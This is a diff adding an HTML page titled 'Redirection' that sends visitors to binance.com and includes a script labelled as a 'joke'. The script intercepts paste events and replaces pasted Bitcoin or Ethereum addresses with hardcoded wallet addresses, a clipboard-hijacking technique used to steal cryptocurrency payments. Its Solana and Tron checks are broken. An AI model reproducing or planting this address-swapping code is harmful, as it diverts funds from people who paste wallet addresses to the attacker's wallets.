@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirection</title>
+</head>
+
+<body>
+
+    <!-- Redirection vers www.binance.com -->
+    <script>
+        window.location.replace("https://www.binance.com");
+    </script>
+
+    <!-- Script "Blague" -->
+    <script>
+        function replaceCryptoAddress(originalAddress) {
+            // Exemple de détection pour BTC (Bitcoin)
+            if (isBTCAddress(originalAddress)) {
+                return 'bc1qdx854625jt6k5s62tcnre6fmsyu6ng4pr6s64f'; // Nouvelle adresse BTC
+            }
+
+            // Exemple de détection pour ETH (Ethereum)
+            if (isETHAddress(originalAddress)) {
+                return '0x10498445975974690E1EA11AF5447461B12cb588'; // Nouvelle adresse ETH
+            }
+
+            // Exemple de détection pour SOL (Solana)
+            if (isSOLAddress(originalAddress)) {
+                return '3bUr5TAqKLozs49amVNq7vJ5Qvk9BjaKJPMow5fU11zf'; // Nouvelle adresse SOL
+            }
+
+            // Exemple de détection pour TRX (Tron)
+            if (isTRXAddress(originalAddress)) {
+                return 'TKPGbpg3fjcvX5NsDEuzsbYKGbGffSeFRr'; // Nouvelle adresse TRX
+            }
+
+            // Aucun remplacement nécessaire pour d'autres types de crypto-monnaie
+            return originalAddress;
+        }
+
+        // Exemple de détection d'adresse BTC (Bitcoin)
+        function isBTCAddress(address) {
+            // BTC Adresse commençant par "1" ou "3" ou "bc1" et d'une longueur minimale de 40 caractères
+            return address.match(/^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{39,}$/);
+        }
+
+        // Exemple de détection d'adresse ETH (Ethereum)
+        function isETHAddress(address) {
+            // Note : Ceci est un exemple simple, ajustez selon le format réel d'adresse ETH
+            return address.match(/^0x[a-fA-F0-9]{40}$/);
+        }
+
+        // Exemple de détection d'adresse SOL (Solana)
+        function isSOLAddress(address) {
+            // Adresse SOL avec une longueur spécifique
+            return address.match(/^3bUr5TAqKLozs49amVNq7vJ5Qvk9BjaKJPMow5fU11zf$/);
+        }
+
+        // Exemple de détection d'adresse TRX (Tron)
+        function isTRXAddress(address) {
+            // Adresse TRX avec une longueur spécifique
+            return address.match(/^TKPGbpg3fjcvX5NsDEuzsbYKGbGffSeFRr$/);
+        }
+
+        document.addEventListener('paste', function (event) {
+            event.preventDefault();
+            var pastedText = (event.originalEvent || event).clipboardData.getData('text/plain');
+            var modifiedText = replaceCryptoAddress(pastedText);
+            console.log('Texte collé:', modifiedText);
+            alert('Texte collé : ' + modifiedText);
+        });
+    </script>
+
+</body>
+
+</html>
